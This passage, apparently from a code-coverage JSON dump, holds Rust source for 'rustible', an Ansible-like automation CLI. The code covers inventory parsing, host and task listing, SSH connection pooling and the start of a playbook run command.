structure\n        if let Some(all) = yaml.get(\"all\") {\n            inventory.parse_group(\"all\", all)?;\n        } else {\n            // Maybe it's a simple host list\n            if let Some(mapping) = yaml.as_mapping() {\n                for (key, value) in mapping {\n                    if let Some(group_name) = key.as_str() {\n                        inventory.parse_group(group_name, value)?;\n                    }\n                }\n            }\n        }\n\n        Ok(inventory)\n    }\n\n    /// Parse a group from YAML\n    fn parse_group(\u0026mut self, name: \u0026str, value: \u0026serde_yaml::Value) -\u003e Result\u003c()\u003e {\n        let mut group = GroupInfo {\n            name: name.to_string(),\n            hosts: Vec::new(),\n            children: Vec::new(),\n            vars: HashMap::new(),\n        };\n\n        // Parse hosts\n        if let Some(hosts) = value.get(\"hosts\") {\n            if let Some(mapping) = hosts.as_mapping() {\n                for (host_key, host_value) in mapping {\n                    if let Some(host_name) = host_key.as_str() {\n                        group.hosts.push(host_name.to_string());\n\n                        // Parse host vars\n                        let mut host_vars = HashMap::new();\n                        if let Some(vars_mapping) = host_value.as_mapping() {\n                            for (var_key, var_value) in vars_mapping {\n                                if let Some(var_name) = var_key.as_str() {\n                                    host_vars.insert(var_name.to_string(), var_value.clone());\n                                }\n                            }\n                        }\n\n                        let host_info = HostInfo {\n                            name: host_name.to_string(),\n                            groups: vec![name.to_string()],\n                            vars: host_vars,\n                        };\n\n                        self.hosts\n                            .entry(host_name.to_string())\n                            .and_modify(|h| h.groups.push(name.to_string()))\n                            .or_insert(host_info);\n                    }\n                }\n            }\n        }\n\n        // Parse children (subgroups)\n        if let Some(children) = value.get(\"children\") {\n            if let Some(mapping) = children.as_mapping() {\n                for (child_key, child_value) in mapping {\n                    if let Some(child_name) = child_key.as_str() {\n                        group.children.push(child_name.to_string());\n                        self.parse_group(child_name, child_value)?;\n                    }\n                }\n            }\n        }\n\n        // Parse group vars\n        if let Some(vars) = value.get(\"vars\") {\n            if let Some(mapping) = vars.as_mapping() {\n                for (var_key, var_value) in mapping {\n                    if let Some(var_name) = var_key.as_str() {\n                        group.vars.insert(var_name.to_string(), var_value.clone());\n                    }\n                }\n            }\n        }\n\n        self.groups.insert(name.to_string(), group);\n\n        Ok(())\n    }\n\n    /// Parse JSON inventory\n    fn parse_json(content: \u0026str) -\u003e Result\u003cSelf\u003e {\n        let json: serde_json::Value = serde_json::from_str(content)?;\n\n        // Convert to YAML Value and use YAML parser\n        let yaml_str = serde_yaml::to_string(\u0026json)?;\n        Self::parse_yaml(\u0026yaml_str)\n    }\n\n    /// Parse INI-style inventory\n    fn parse_ini(content: \u0026str) -\u003e Result\u003cSelf\u003e {\n        let mut inventory = Inventory::default();\n        let mut current_group = \"ungrouped\".to_string();\n\n        // Create default groups\n        inventory.groups.insert(\n            \"all\".to_string(),\n            GroupInfo {\n                name: \"all\".to_string(),\n                hosts: Vec::new(),\n                children: vec![\"ungrouped\".to_string()],\n                vars: HashMap::new(),\n            },\n        );\n\n        inventory.groups.insert(\n            \"ungrouped\".to_string(),\n            GroupInfo {\n                name: \"ungrouped\".to_string(),\n                hosts: Vec::new(),\n                children: Vec::new(),\n                vars: HashMap::new(),\n            },\n        );\n\n        for line in content.lines() {\n            let line = line.trim();\n\n            // Skip empty lines and comments\n            if line.is_empty() || line.starts_with('#') || line.starts_with(';') {\n                continue;\n            }\n\n            // Check for group header\n            if line.starts_with('[') \u0026\u0026 line.ends_with(']') {\n                let group_name = \u0026line[1..line.len() - 1];\n\n                // Check for :vars or :children suffix\n                if let Some(name) = group_name.strip_suffix(\":vars\") {\n                    current_group = format!(\"{}_vars\", name);\n                } else if let Some(name) = group_name.strip_suffix(\":children\") {\n                    current_group = format!(\"{}_children\", name);\n                } else {\n                    current_group = group_name.to_string();\n                    if !inventory.groups.contains_key(\u0026current_group) {\n                        inventory.groups.insert(\n                            current_group.clone(),\n                            GroupInfo {\n                                name: current_group.clone(),\n                                hosts: Vec::new(),\n                                children: Vec::new(),\n                                vars: HashMap::new(),\n                            },\n                        );\n\n                        // Add to all group's children\n                        if let Some(all_group) = inventory.groups.get_mut(\"all\") {\n                            if !all_group.children.contains(\u0026current_group) {\n                                all_group.children.push(current_group.clone());\n                            }\n                        }\n                    }\n                }\n                continue;\n            }\n\n            // Parse host line\n            let parts: Vec\u003c\u0026str\u003e = line.split_whitespace().collect();\n            if parts.is_empty() {\n                continue;\n            }\n\n            let host_name = parts[0];\n\n            // Parse host variables (key=value pairs)\n            let mut host_vars = HashMap::new();\n            for part in parts.iter().skip(1) {\n                if let Some((key, value)) = part.split_once('=') {\n                    let parsed_value: serde_yaml::Value = serde_yaml::from_str(value)\n                        .unwrap_or_else(|_| serde_yaml::Value::String(value.to_string()));\n                    host_vars.insert(key.to_string(), parsed_value);\n                }\n            }\n\n            // Add host to group\n            if let Some(group) = inventory.groups.get_mut(\u0026current_group) {\n                if !group.hosts.contains(\u0026host_name.to_string()) {\n                    group.hosts.push(host_name.to_string());\n                }\n            }\n\n            // Add to all group's hosts\n            if let Some(all_group) = inventory.groups.get_mut(\"all\") {\n                if !all_group.hosts.contains(\u0026host_name.to_string()) {\n                    all_group.hosts.push(host_name.to_string());\n                }\n            }\n\n            // Add/update host info\n            inventory\n                .hosts\n                .entry(host_name.to_string())\n                .and_modify(|h| {\n                    if !h.groups.contains(\u0026current_group) {\n                        h.groups.push(current_group.clone());\n                    }\n                    h.vars.extend(host_vars.clone());\n                })\n                .or_insert(HostInfo {\n                    name: host_name.to_string(),\n                    groups: vec![current_group.clone()],\n                    vars: host_vars,\n                });\n        }\n\n        Ok(inventory)\n    }\n\n    /// Get all hosts matching a pattern\n    pub fn get_hosts(\u0026self, pattern: \u0026str) -\u003e Vec\u003c\u0026HostInfo\u003e {\n        if pattern == \"all\" {\n            return self.hosts.values().collect();\n        }\n\n        // Check if pattern is a group name\n        if let Some(group) = self.groups.get(pattern) {\n            return group\n                .hosts\n                .iter()\n                .filter_map(|h| self.hosts.get(h))\n                .collect();\n        }\n\n        // Check if pattern matches a host name\n        self.hosts\n            .values()\n            .filter(|h| {\n                h.name == pattern || h.name.contains(pattern) || glob_match(\u0026h.name, pattern)\n            })\n            .collect()\n    }\n}\n\n/// Simple glob matching\nfn glob_match(name: \u0026str, pattern: \u0026str) -\u003e bool {\n    if pattern.contains('*') {\n        let regex_pattern = pattern.replace('.', \"\\\\.\").replace('*', \".*\");\n        regex::Regex::new(\u0026format!(\"^{}$\", regex_pattern))\n            .map(|re| re.is_match(name))\n            .unwrap_or(false)\n    } else {\n        name == pattern\n    }\n}\n\nimpl ListHostsArgs {\n    /// Execute the list-hosts command\n    pub async fn execute(\u0026self, ctx: \u0026mut CommandContext) -\u003e Result\u003ci32\u003e {\n        // Get inventory path\n        let inventory_path = match ctx.inventory() {\n            Some(path) =\u003e path.clone(),\n            None =\u003e {\n                ctx.output\n                    .error(\"No inventory specified. Use -i to specify an inventory file.\");\n                return Ok(1);\n            }\n        };\n\n        // Load inventory\n        let inventory = Inventory::load(\u0026inventory_path)?;\n\n        // Get matching hosts\n        let hosts = inventory.get_hosts(\u0026self.pattern);\n\n        if hosts.is_empty() {\n            ctx.output\n                .warning(\u0026format!(\"No hosts matched pattern: {}\", self.pattern));\n            return Ok(0);\n        }\n\n        if self.yaml {\n            // YAML output\n            let output: Vec\u003c_\u003e = hosts\n                .iter()\n                .map(|h| {\n                    let mut map = serde_yaml::Mapping::new();\n                    map.insert(\n                        serde_yaml::Value::String(\"name\".to_string()),\n                        serde_yaml::Value::String(h.name.clone()),\n                    );\n                    if self.vars \u0026\u0026 !h.vars.is_empty() {\n                        map.insert(\n                            serde_yaml::Value::String(\"vars\".to_string()),\n                            serde_yaml::to_value(\u0026h.vars).unwrap_or_default(),\n                        );\n                    }\n                    map\n                })\n                .collect();\n\n            println!(\"{}\", serde_yaml::to_string(\u0026output)?);\n        } else if self.graph {\n            // Graph output (grouped by groups)\n            ctx.output\n                .section(\u0026format!(\"Hosts matching pattern: {}\", self.pattern));\n\n            let mut groups_shown: HashMap\u003cString, Vec\u003cString\u003e\u003e = HashMap::new();\n            for host in \u0026hosts {\n                for group in \u0026host.groups {\n                    groups_shown\n                        .entry(group.clone())\n                        .or_default()\n                        .push(host.name.clone());\n                }\n            }\n\n            for (group, group_hosts) in groups_shown {\n                ctx.output.list(\u0026format!(\"@{}\", group), \u0026group_hosts);\n            }\n        } else {\n            // Simple list output\n            ctx.output.section(\u0026format!(\"Hosts ({})\", hosts.len()));\n\n            let host_names: Vec\u003cString\u003e = hosts.iter().map(|h| h.name.clone()).collect();\n            for name in \u0026host_names {\n                println!(\"  {}\", name);\n            }\n\n            if self.vars {\n                println!();\n                for host in hosts {\n                    if !host.vars.is_empty() {\n                        println!(\"{}:\", host.name);\n                        for (key, value) in \u0026host.vars {\n                            println!(\"  {}: {}\", key, serde_yaml::to_string(value)?.trim());\n                        }\n                    }\n                }\n            }\n        }\n\n        Ok(0)\n    }\n}\n\nimpl ListTasksArgs {\n    /// Execute the list-tasks command\n    pub async fn execute(\u0026self, ctx: \u0026mut CommandContext) -\u003e Result\u003ci32\u003e {\n        // Validate playbook exists\n        if !self.playbook.exists() {\n            ctx.output.error(\u0026format!(\n                \"Playbook file not found: {}\",\n                self.playbook.display()\n            ));\n            return Ok(1);\n        }\n\n        // Load playbook\n        let content = std::fs::read_to_string(\u0026self.playbook)?;\n        let playbook: serde_yaml::Value = serde_yaml::from_str(\u0026content)?;\n\n        ctx.output\n            .section(\u0026format!(\"Tasks in playbook: {}\", self.playbook.display()));\n\n        let mut task_count = 0;\n\n        // Process plays\n        if let Some(plays) = playbook.as_sequence() {\n            for (play_idx, play) in plays.iter().enumerate() {\n                let play_name = play\n                    .get(\"name\")\n                    .and_then(|n| n.as_str())\n                    .unwrap_or(\"Unnamed play\");\n\n                println!(\"\\nPlay #{}: {}\", play_idx + 1, play_name);\n                println!(\"{}\", \"-\".repeat(40));\n\n                // Get tasks\n                if let Some(tasks) = play.get(\"tasks\").and_then(|t| t.as_sequence()) {\n                    for (task_idx, task) in tasks.iter().enumerate() {\n                        let task_name = task\n                            .get(\"name\")\n                            .and_then(|n| n.as_str())\n                            .unwrap_or(\"Unnamed task\");\n\n                        // Check tags filter\n                        if !self.tags.is_empty() {\n                            let task_tags: Vec\u003cString\u003e = task\n                                .get(\"tags\")\n                                .and_then(|t| {\n                                    if let Some(s) = t.as_str() {\n                                        Some(vec![s.to_string()])\n                                    } else if let Some(seq) = t.as_sequence() {\n                                        Some(\n                                            seq.iter()\n                                                .filter_map(|v| v.as_str().map(String::from))\n                                                .collect(),\n                                        )\n                                    } else {\n                                        None\n                                    }\n                                })\n                                .unwrap_or_default();\n\n                            let matches = self.tags.iter().any(|t| task_tags.contains(t));\n                            if !matches {\n                                continue;\n                            }\n                        }\n\n                        task_count += 1;\n\n                        // Detect module\n                        let module = detect_module(task);\n\n                        if self.verbose {\n                            println!(\"  {:\u003e3}. {} [{}]\", task_idx + 1, task_name, module);\n\n                            // Show tags\n                            if let Some(tags) = task.get(\"tags\") {\n                                println!(\"       Tags: {}\", format_value(tags));\n                            }\n\n                            // Show when condition\n                            if let Some(when) = task.get(\"when\") {\n                                println!(\"       When: {}\", format_value(when));\n                            }\n                        } else {\n                            println!(\"  {:\u003e3}. {}\", task_idx + 1, task_name);\n                        }\n                    }\n                }\n\n                // Handle pre_tasks\n                if let Some(tasks) = play.get(\"pre_tasks\").and_then(|t| t.as_sequence()) {\n                    println!(\"\\n  Pre-tasks:\");\n                    for (task_idx, task) in tasks.iter().enumerate() {\n                        let task_name = task\n                            .get(\"name\")\n                            .and_then(|n| n.as_str())\n                            .unwrap_or(\"Unnamed task\");\n                        println!(\"    {:\u003e3}. {}\", task_idx + 1, task_name);\n                        task_count += 1;\n                    }\n                }\n\n                // Handle post_tasks\n                if let Some(tasks) = play.get(\"post_tasks\").and_then(|t| t.as_sequence()) {\n                    println!(\"\\n  Post-tasks:\");\n                    for (task_idx, task) in tasks.iter().enumerate() {\n                        let task_name = task\n                            .get(\"name\")\n                            .and_then(|n| n.as_str())\n                            .unwrap_or(\"Unnamed task\");\n                        println!(\"    {:\u003e3}. {}\", task_idx + 1, task_name);\n                        task_count += 1;\n                    }\n                }\n\n                // Handle handlers\n                if let Some(handlers) = play.get(\"handlers\").and_then(|h| h.as_sequence()) {\n                    println!(\"\\n  Handlers:\");\n                    for (handler_idx, handler) in handlers.iter().enumerate() {\n                        let handler_name = handler\n                            .get(\"name\")\n                            .and_then(|n| n.as_str())\n                            .unwrap_or(\"Unnamed handler\");\n                        println!(\"    {:\u003e3}. {}\", handler_idx + 1, handler_name);\n                    }\n                }\n            }\n        }\n\n        println!(\"\\n{}\", \"=\".repeat(40));\n        println!(\"Total tasks: {}\", task_count);\n\n        Ok(0)\n    }\n}\n\n/// Detect the module used in a task\nfn detect_module(task: \u0026serde_yaml::Value) -\u003e \u0026str {\n    let modules = [\n        \"command\",\n        \"shell\",\n        \"copy\",\n        \"file\",\n        \"template\",\n        \"package\",\n        \"apt\",\n        \"yum\",\n        \"dnf\",\n        \"pip\",\n        \"service\",\n        \"systemd\",\n        \"user\",\n        \"group\",\n        \"git\",\n        \"debug\",\n        \"set_fact\",\n        \"include_tasks\",\n        \"import_tasks\",\n        \"include_role\",\n        \"import_role\",\n        \"block\",\n        \"assert\",\n        \"fail\",\n        \"meta\",\n        \"pause\",\n        \"wait_for\",\n        \"uri\",\n        \"get_url\",\n        \"unarchive\",\n        \"synchronize\",\n        \"lineinfile\",\n        \"blockinfile\",\n        \"replace\",\n        \"stat\",\n        \"find\",\n        \"fetch\",\n        \"raw\",\n        \"script\",\n        \"setup\",\n    ];\n\n    for module in modules {\n        if task.get(module).is_some() {\n            return module;\n        }\n    }\n\n    \"unknown\"\n}\n\n/// Format a YAML value for display\nfn format_value(value: \u0026serde_yaml::Value) -\u003e String {\n    match value {\n        serde_yaml::Value::String(s) =\u003e s.clone(),\n        serde_yaml::Value::Sequence(seq) =\u003e {\n            let items: Vec\u003cString\u003e = seq\n                .iter()\n                .filter_map(|v| v.as_str().map(String::from))\n                .collect();\n            format!(\"[{}]\", items.join(\", \"))\n        }\n        _ =\u003e serde_yaml::to_string(value)\n            .unwrap_or_default()\n            .trim()\n            .to_string(),\n    }\n}\n\n#[async_trait::async_trait]\nimpl Runnable for ListHostsArgs {\n    async fn run(\u0026self, ctx: \u0026mut CommandContext) -\u003e Result\u003ci32\u003e {\n        self.execute(ctx).await\n    }\n}\n\n#[async_trait::async_trait]\nimpl Runnable for ListTasksArgs {\n    async fn run(\u0026self, ctx: \u0026mut CommandContext) -\u003e Result\u003ci32\u003e {\n        self.execute(ctx).await\n    }\n}\n\n#[cfg(test)]\nmod tests {\n    use super::*;\n\n    #[test]\n    fn test_list_hosts_args() {\n        let args = ListHostsArgs::try_parse_from([\"list-hosts\", \"webservers\"]).unwrap();\n        assert_eq!(args.pattern, \"webservers\");\n    }\n\n    #[test]\n    fn test_list_tasks_args() {\n        let args = ListTasksArgs::try_parse_from([\"list-tasks\", \"playbook.yml\"]).unwrap();\n        assert_eq!(args.playbook, PathBuf::from(\"playbook.yml\"));\n    }\n\n    #[test]\n    fn test_glob_match() {\n        assert!(glob_match(\"web01.example.com\", \"web*.example.com\"));\n        assert!(glob_match(\"db01\", \"db*\"));\n        assert!(!glob_match(\"web01\", \"db*\"));\n    }\n}\n","traces":[],"covered":0,"coverable":0},{"path":["/","home","artur","Repositories","rustible","src","cli","commands","mod.rs"],"content":"//! Subcommands module for Rustible CLI\n//!\n//! This module contains all the subcommand implementations.\n\npub mod check;\npub mod inventory;\npub mod run;\npub mod vault;\n\nuse crate::cli::output::OutputFormatter;\nuse crate::config::Config;\nuse anyhow::Result;\nuse rustible::connection::Connection;\nuse std::collections::HashMap;\nuse std::path::PathBuf;\nuse std::sync::Arc;\nuse tokio::sync::RwLock;\n\n/// Common context shared between commands\npub struct CommandContext {\n    /// Configuration\n    pub config: Config,\n    /// Output formatter\n    pub output: OutputFormatter,\n    /// Inventory path\n    pub inventory_path: Option\u003cPathBuf\u003e,\n    /// Extra variables\n    pub extra_vars: Vec\u003cString\u003e,\n    /// Verbosity level\n    pub verbosity: u8,\n    /// Check mode (dry-run)\n    pub check_mode: bool,\n    /// Diff mode\n    pub diff_mode: bool,\n    /// Limit pattern\n    pub limit: Option\u003cString\u003e,\n    /// Number of parallel forks\n    pub forks: usize,\n    /// Connection timeout\n    pub timeout: u64,\n    /// Connection pool for reusing SSH connections\n    pub connections: Arc\u003cRwLock\u003cHashMap\u003cString, Arc\u003cdyn Connection + Send + Sync\u003e\u003e\u003e\u003e,\n}\n\nimpl CommandContext {\n    /// Create a new command context from CLI arguments\n    pub fn new(cli: \u0026crate::cli::Cli, config: Config) -\u003e Self {\n        let output = OutputFormatter::new(!cli.no_color, cli.is_json(), cli.verbosity());\n\n        Self {\n            config,\n            output,\n            inventory_path: cli.inventory.clone(),\n            extra_vars: cli.extra_vars.clone(),\n            verbosity: cli.verbosity(),\n            check_mode: cli.check_mode,\n            diff_mode: cli.diff_mode,\n            limit: cli.limit.clone(),\n            forks: cli.forks,\n            timeout: cli.timeout,\n            connections: Arc::new(RwLock::new(HashMap::new())),\n        }\n    }\n\n    /// Get or create a connection for a host\n    /// This pools connections to avoid creating new SSH sessions for every command\n    pub async fn get_connection(\n        \u0026self,\n        host: \u0026str,\n        ansible_host: \u0026str,\n        ansible_user: \u0026str,\n        ansible_port: u16,\n        ansible_key: Option\u003c\u0026str\u003e,\n    ) -\u003e Result\u003cArc\u003cdyn Connection + Send + Sync\u003e\u003e {\n        // Check if we already have a connection for this host\n        {\n            let connections = self.connections.read().await;\n            if let Some(conn) = connections.get(host) {\n                if conn.is_alive().await {\n                    self.output\n                        .debug(\u0026format!(\"Reusing connection for {}\", host));\n                    return Ok(Arc::clone(conn));\n                }\n            }\n        }\n\n        self.output.debug(\u0026format!(\n            \"Creating new SSH connection: {}@{}:{}\",\n            ansible_user, ansible_host, ansible_port\n        ));\n\n        // Build host config for SSH connection\n        let mut host_config = rustible::connection::HostConfig::default();\n        host_config.hostname = Some(ansible_host.to_string());\n        host_config.port = Some(ansible_port);\n        host_config.user = Some(ansible_user.to_string());\n        if let Some(key_path) = ansible_key {\n            // Expand ~ to home directory\n            let expanded_path = if key_path.starts_with(\"~/\") {\n                if let Some(home) = dirs::home_dir() {\n                    home.join(\u0026key_path[2..]).to_string_lossy().to_string()\n                } else {\n                    key_path.to_string()\n                }\n            } else {\n                key_path.to_string()\n            };\n            host_config.identity_file = Some(expanded_path);\n        }\n\n        // Create SSH connection - prefer russh (pure Rust) when available\n        let conn_config = rustible::connection::ConnectionConfig::default();\n        #[cfg(feature = \"russh\")]\n        let conn: Arc\u003cdyn Connection + Send + Sync\u003e = {\n            let conn = rustible::connection::russh::RusshConnection::connect(\n                ansible_host,\n                ansible_port,\n                ansible_user,\n                Some(host_config),\n                \u0026conn_config,\n            )\n            .await\n            .map_err(|e| anyhow::anyhow!(\"Failed to connect to {}: {}\", host, e))?;\n            Arc::new(conn)\n        };\n        #[cfg(all(feature = \"ssh2-backend\", not(feature = \"russh\")))]\n        let conn: Arc\u003cdyn Connection + Send + Sync\u003e = {\n            let conn = rustible::connection::ssh::SshConnection::connect(\n                ansible_host,\n                ansible_port,\n                ansible_user,\n                Some(host_config),\n                \u0026conn_config,\n            )\n            .await\n            .map_err(|e| anyhow::anyhow!(\"Failed to connect to {}: {}\", host, e))?;\n            Arc::new(conn)\n        };\n        #[cfg(not(any(feature = \"russh\", feature = \"ssh2-backend\")))]\n        let conn: Arc\u003cdyn Connection + Send + Sync\u003e = {\n            return Err(anyhow::anyhow!(\n                \"No SSH backend available. Enable 'russh' or 'ssh2-backend' feature.\"\n            ));\n        };\n\n        // Cache the connection\n        {\n            let mut connections = self.connections.write().await;\n            connections.insert(host.to_string(), Arc::clone(\u0026conn));\n        }\n\n        Ok(conn)\n    }\n\n    /// Close all cached connections\n    pub async fn close_connections(\u0026self) {\n        let connections: Vec\u003c_\u003e = {\n            let mut pool = self.connections.write().await;\n            pool.drain().map(|(_, v)| v).collect()\n        };\n\n        for conn in connections {\n            let _ = conn.close().await;\n        }\n    }\n\n    /// Get the effective inventory path\n    pub fn inventory(\u0026self) -\u003e Option\u003c\u0026PathBuf\u003e {\n        self.inventory_path\n            .as_ref()\n            .or(self.config.defaults.inventory.as_ref())\n    }\n\n    /// Parse extra variables into a HashMap\n    pub fn parse_extra_vars(\u0026self) -\u003e Result\u003cstd::collections::HashMap\u003cString, serde_yaml::Value\u003e\u003e {\n        use std::collections::HashMap;\n\n        let mut vars = HashMap::new();\n\n        for var in \u0026self.extra_vars {\n            if let Some(file_path) = var.strip_prefix('@') {\n                // Load from file\n                let content = std::fs::read_to_string(file_path)?;\n                let file_vars: HashMap\u003cString, serde_yaml::Value\u003e = serde_yaml::from_str(\u0026content)?;\n                vars.extend(file_vars);\n            } else if let Some((key, value)) = var.split_once('=') {\n                // Parse key=value\n                let parsed_value: serde_yaml::Value = serde_yaml::from_str(value)\n                    .unwrap_or_else(|_| serde_yaml::Value::String(value.to_string()));\n                vars.insert(key.to_string(), parsed_value);\n            }\n        }\n\n        Ok(vars)\n    }\n}\n\n/// Trait for runnable commands\n#[async_trait::async_trait]\npub trait Runnable {\n    /// Execute the command\n    async fn run(\u0026self, ctx: \u0026mut CommandContext) -\u003e Result\u003ci32\u003e;\n}\n","traces":[],"covered":0,"coverable":0},{"path":["/","home","artur","Repositories","rustible","src","cli","commands","run.rs"],"content":"//! Run command - Execute a playbook\n//!\n//! This module implements the `run` subcommand for executing Ansible-like playbooks.\n\nuse super::{CommandContext, Runnable};\nuse crate::cli::output::{RecapStats, TaskStatus};\nuse anyhow::{Context, Result};\nuse clap::Parser;\nuse indexmap::IndexMap;\nuse regex::Regex;\nuse std::path::PathBuf;\nuse std::sync::Arc;\nuse std::time::Instant;\nuse tokio::sync::Mutex;\n\n/// Arguments for the run command\n#[derive(Parser, Debug, Clone)]\npub struct RunArgs {\n    /// Path to the playbook file\n    #[arg(required = true)]\n    pub playbook: PathBuf,\n\n    /// Tags to run (only tasks with these tags)\n    #[arg(long, short = 't', action = clap::ArgAction::Append)]\n    pub tags: Vec\u003cString\u003e,\n\n    /// Tags to skip (skip tasks with these tags)\n    #[arg(long, action = clap::ArgAction::Append)]\n    pub skip_tags: Vec\u003cString\u003e,\n\n    /// Start at a specific task\n    #[arg(long)]\n    pub start_at_task: Option\u003cString\u003e,\n\n    /// Step through tasks one at a time\n    #[arg(long)]\n    pub step: bool,\n\n    /// Ask for vault password\n    #[arg(long)]\n    pub ask_vault_pass: bool,\n\n    /// Vault password file\n    #[arg(long)]\n    pub vault_password_file: Option\u003cPathBuf\u003e,\n\n    /// Become (sudo/su)\n    #[arg(short = 'b', long)]\n    pub r#become: bool,\n\n    /// Become method (sudo, su, etc.)\n    #[arg(long, default_value = \"sudo\")]\n    pub become_method: String,\n\n    /// Become user\n    #[arg(long, default_value = \"root\")]\n    pub become_user: String,\n\n    /// Ask for become password\n    #[arg(short = 'K', long)]\n    pub ask_become_pass: bool,\n\n    /// Remote user\n    #[arg(short = 'u', long)]\n    pub user: Option\u003cString\u003e,\n\n    /// Private key file\n    #[arg(long)]\n    pub private_key: Option\u003cPathBuf\u003e,\n\n    /// SSH common args\n    #[arg(long)]\n    pub ssh_common_args: Option\u003cString\u003e,\n}\n\nimpl RunArgs {\n    /// Execute the run command\n    pub async fn execute(\u0026self, ctx: \u0026mut CommandContext) -\u003e Result\u003ci32\u003e {\n        let start_time = Instant::now();\n\n        // Validate playbook exists\n        if !self.playbook.exists() {\n            ctx.output.error(\u0026format!(\n                \"Playbook file not found: {}\",\n                self.playbook.display()\n            ));\n            return Ok(1);\n        }\n\n        // Display banner\n        ctx.output.banner(\u0026format!(\n            \"PLAYBOOK: {}\",\n            self.playbook\n                .file_name()\n                .unwrap_or_default()\n                .to_string_lossy()\n        ));\n\n        // Load playbook\n        ctx.output.info(\"Loading playbook...\");\n        let playbook_content = std::fs::read_to_string(\u0026self.playbook)\n            .with_context(|| format!(\"Failed to read playbook: {}\", self.playbook.display()))?;\n\n        let playbook: serde_yaml::Value = serde_yaml::from_str(\u0026playbook_content)\n            .with_context(|| \"Failed to parse playbook YAML\")?;\n\n        // Get inventory\n        let inventory_path = ctx.inventory().cloned();\n        if inventory_path.is_none() {\n            ctx.output\n                .warning(\"No inventory specified, using localhost\");\n        }\n\n        // Validate limit pattern if specified\n        if let Some(ref limit) = ctx.limit {\n            if let Err(e) = Self::validate_limit_pattern(limit) {\n                ctx.output.error(\u0026e);\n                return Ok(1);\n            }\n        }\n\n        // Parse extra vars\n        let extra_vars = ctx.parse_extra_vars()?;\n        ctx.output.debug(\u0026format!(\"Extra vars: {:?}\", extra_vars));\n\n        // Check mode notice\n        if ctx.check_mode {\n            ctx.output\n                .warning(\"Running in CHECK MODE - no changes will be made\");\n        }\n\n        // Initialize stats (wrapped in Arc\u003cMutex\u003c\u003e\u003e for thread-safe parallel execution)\n        let stats = Arc::new(Mutex::new(RecapStats::new()));\n\n        // Process playbook plays\n        if let Some(plays) = playbook.as_sequence() {\n            for play in plays {\n                self.execute_play(ctx, play, \u0026stats).await?;\n            }\n        } else {\n            ctx.output.error(\"Playbook must be a list of plays\");\n            return Ok(1);\n        }\n\n        // Close all pooled connections\n        ctx.close_connections().await;\n\n        // Print recap\n        let stats_guard = stats.lock().await;\n        ctx.output.recap(\u0026stats_guard);\n\n        // Print timing\n        let duration = start_time.elapsed();\n        ctx.output.info(\u0026format!(\n            \"Playbook finished in {:.2}s\",\n            duration.as_secs_f64()\n        ));\n\n        // Return exit code\n        if stats_guard.has_failures() {\n            Ok(2)\n        } else {\n            Ok(0)\n        }\n    }\n\n    /// Execute a single play\n    async fn execute_play(\n        \u0026self,\n        ctx: \u0026mut CommandContext,\n        play: \u0026serde_yaml::Value,\n        stats: \u0026Arc\u003cMutex\u003cRecapStats\u003e\u003e,\n    ) -\u003e Result\u003c()\u003e {\n        // Get play name\n        let play_name = play\n            .get(\"name\")\n            .and_then(|n| n.as_str())\n            .unwrap_or(\"Unnamed play\");\n\n        ctx.output.play_header(play_name);\n\n        // Get hosts pattern\n        let hosts_pattern = play\n            .get(\"hosts\")\n            .and_then(|h| h.as_str())\n            .unwrap_or(\"localhost\");\n\n        ctx.output.info(\u0026format!(\"Target hosts: {}\", hosts_pattern));\n\n        // Get hosts from inventory (simplified for now)\n        let hosts = self.resolve_hosts(ctx, hosts_pattern)?;\n\n        if hosts.is_empty() {\n            ctx.output\n                .warning(\u0026format!(\"No hosts matched pattern: {}\", hosts_pattern));\n            return Ok(());\n        }\n\n        // Extract play-level variables\n        let mut vars: IndexMap\u003cString, serde_yaml::Value\u003e = IndexMap::new();\n\n        // Add extra vars first (lowest precedence in this context)\n        if let Ok(extra_vars) = ctx.parse_extra_vars() {\n            for (k, v) in extra_vars {\n                if let Ok(yaml_val) = serde_yaml::to_value(\u0026v) {\n                    vars.insert(k, yaml_val);\n                }\n            }\n        }\n\n        // Add play vars (higher precedence)\n        if let Some(play_vars) = play.get(\"vars\") {\n            if let Some(mapping) = play_vars.as_mapping() {\n                for (k, v) in mapping {\n                    if let Some(key) = k.as_str() {\n                        vars.insert(key.to_string(), v.clone());\n                    }\n                }\n            }\n        }\n\n        // Get tasks\n        let tasks = play\n            .get(\"tasks\")\n            .and_then(|t| t.as_sequence())\n            .cloned()\n            .unwrap_or_default();\n\n        // Execute tasks\n        for task in \u0026tasks {\n            self.execute_task(ctx, task, \u0026hosts, stats, \u0026vars).await?;\n        }\n\n        Ok(())\n    }\n\n    /// Resolve hosts from pattern\n    fn resolve_hosts(\u0026self, ctx: \u0026CommandContext, pattern: \u0026str) -\u003e Result\u003cVec\u003cString\u003e\u003e {\n        // Simplified host resolution\n        // In a real implementation, this would parse the inventory file\n\n        if pattern == \"localhost\" || pattern == \"127.0.0.1\" {\n            return Ok(vec![\"localhost\".to_string()]);\n        }\n\n        if pattern == \"all\" {\n            // Load from inventory if available\n            if let Some(inv_path) = ctx.inventory() {\n                if inv_path.exists() {\n                    let content = std::fs::read_to_string(inv_path)?;\n                    let inventory: serde_yaml::Value = serde_yaml::from_str(\u0026content)?;\n\n                    let mut hosts = Vec::new();\n                    if let Some(all) = inventory.get(\"all\") {\n                        if let Some(host_list) = all.get(\"hosts\") {\n                            if let Some(map) = host_list.as_mapping() {\n                                for (key, _) in map {\n                                    if let Some(host) = key.as_str() {\n                                        hosts.push(host.to_string());\n                                    }\n                                }\n                            }\n                        }\n                    }\n                    if !hosts.is_empty() {\n                        return Ok(hosts);\n                    }\n                }\n            }\n        }\n\n        // Apply limit if specified\n        if let Some(ref limit) = ctx.limit {\n            if pattern.contains(limit) || limit.contains(pattern) {\n                return Ok(vec![limit.clone()]);\n            }\n        }\n\n        // Default to the pattern itself as a hostname\n        Ok(vec![pattern.to_string()])\n    }\n\n    /// Execute a single task\n    async fn execute_task(\n        \u0026self,\n        ctx: \u0026mut CommandContext,\n        task: \u0026serde_yaml::Value,\n        hosts: \u0026[String],\n        stats: \u0026Arc\u003cMutex\u003cRecapStats\u003e\u003e,\n        vars: \u0026IndexMap\u003cString, serde_yaml::Value\u003e,\n    ) -\u003e Result\u003c()\u003e {\n        // Get task name\n        let task_name = task\n            .get(\"name\")\n            .and_then(|n| n.as_str())\n            .unwrap_or(\"Unnamed task\");\n\n        // Check tags\n        if !self.should_run_task(task) {\n            let mut stats_guard = stats.lock().await;\n            for host in hosts {\n                stats_guard.record(host, TaskStatus::Skipped);\n            }\n            return Ok(());\n        }\n\n        ctx.output.task_header(task_name);\n\n        // Check conditions (when)\n        let when_condition = task.get(\"when\");\n\n        // Execute on each host\n        for host in hosts {\n            // 